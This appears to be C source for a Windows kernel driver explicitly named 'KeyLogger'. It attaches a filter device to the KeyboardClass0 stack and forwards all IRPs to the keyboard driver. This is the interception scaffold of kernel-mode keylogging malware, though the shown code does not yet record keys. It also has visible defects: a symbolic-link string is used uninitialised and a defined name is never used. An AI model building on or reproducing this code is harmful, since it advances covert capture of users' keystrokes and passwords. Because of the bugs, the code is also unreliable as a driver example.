#include <ntddk.h>
#include <tchar.h>

#pragma warning(disable: 5045) //Disable Spectre

#define DEVICE_NAME						\
	_T("KeyLogger")

#define DEVICE_PATH						\
	_T("\\Device\\") DEVICE_NAME

#define KEYBOARD_DEVICE_NAME				\
	_T("KeyboardClass0")

#define KEYBOARD_DEVICE_PATH				\
	_T("\\Device\\") KEYBOARD_DEVICE_NAME

#define SYM_LINK_NAME					\
	_T("\\DosDevices\\KeyLogger")

#define NULLASSERT(p)					\
	if (!p) return STATUS_BUFFER_ALL_ZEROS

#define NOTUSED(var)					\
	(VOID)var

#define LOG(msg)						\
	DbgPrint(" === " msg " === ")


struct _DEVICE_EXTENSION
{
	UNICODE_STRING symbolicLink;
	PDEVICE_OBJECT pTargetDeviceObj;
};

typedef struct _DEVICE_EXTENSION DEVICE_EXTENSION;
typedef DEVICE_EXTENSION *PDEVICE_EXTENSION;


NTSTATUS
AddDeviceRoutine(
	_In_ PDRIVER_OBJECT pDriverObject,
	_In_ PDEVICE_OBJECT pPhysicalDeviceObject)
{
	NOTUSED(pPhysicalDeviceObject);
	NOTUSED(pDriverObject);

	UNICODE_STRING deviceName;
	RtlInitUnicodeString(&deviceName, DEVICE_PATH);

	PDEVICE_OBJECT pDeviceObj;
	NTSTATUS returnedStatus = STATUS_SUCCESS;

	returnedStatus = IoCreateDevice(
		pDriverObject,
		sizeof(DEVICE_EXTENSION),
		&deviceName,
		FILE_DEVICE_UNKNOWN,
		0,
		FALSE,
		&pDeviceObj);

	if (!NT_SUCCESS(returnedStatus))
		return returnedStatus;

	PDEVICE_EXTENSION pDeviceExtension = pDeviceObj->DeviceExtension;
	NULLASSERT(pDeviceExtension);

	UNICODE_STRING targetDeviceName;
	RtlInitUnicodeString(&targetDeviceName, KEYBOARD_DEVICE_PATH);

	PFILE_OBJECT pFileObj;
	returnedStatus = IoGetDeviceObjectPointer(
		&targetDeviceName,
		FILE_READ_DATA,
		&pFileObj,
		&pDeviceExtension->pTargetDeviceObj);

	if (!NT_SUCCESS(returnedStatus))
		return returnedStatus;

	IoAttachDeviceToDeviceStack(pDeviceObj, pDeviceExtension->pTargetDeviceObj);

	returnedStatus =
		IoCreateSymbolicLink(&pDeviceExtension->symbolicLink, &deviceName);

	if (!NT_SUCCESS(returnedStatus))
		return returnedStatus;

	return returnedStatus;
}


NTSTATUS
ForwardingIRP(
	_In_ PDEVICE_OBJECT pDevObj,
	_In_ PIRP pIrp)
{
	IoSkipCurrentIrpStackLocation(pIrp);

	PDEVICE_EXTENSION pDeviceExtension = pDevObj->DeviceExtension;
	NULLASSERT(pDeviceExtension);

	return IoCallDriver(pDeviceExtension->pTargetDeviceObj, pIrp);
}


NTSTATUS
PnPHandler(
	_In_ PDEVICE_OBJECT pDevObj,
	_In_ PIRP pIrp)
{
	PIO_STACK_LOCATION pIrpStackLocation =
		IoGetCurrentIrpStackLocation(pIrp);

	NULLASSERT(pIrpStackLocation);

	switch (pIrpStackLocation->MinorFunction)
	{
		case IRP_MN_START_DEVICE:
		{
			LOG("Driver: start");
			break;
		}

		case IRP_MN_STOP_DEVICE:
		{
			LOG("Driver: stop");
			break;
		}
	}

	return ForwardingIRP(pDevObj, pIrp);
}


NTSTATUS
DriverEntry(
	_In_ PDRIVER_OBJECT pDriverObject,
	_In_ PUNICODE_STRING pRegistryPath)
{
	NOTUSED(pRegistryPath);

	NULLASSERT(pDriverObject);
	NULLASSERT(pDriverObject->DriverExtension);
	NULLASSERT(pDriverObject->MajorFunction);

	pDriverObject->DriverExtension->AddDevice = AddDeviceRoutine;

	for (INT i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; ++i)
		pDriverObject->MajorFunction[i] = ForwardingIRP;

	pDriverObject->MajorFunction[IRP_MJ_PNP] = PnPHandler;

	return STATUS_SUCCESS;
}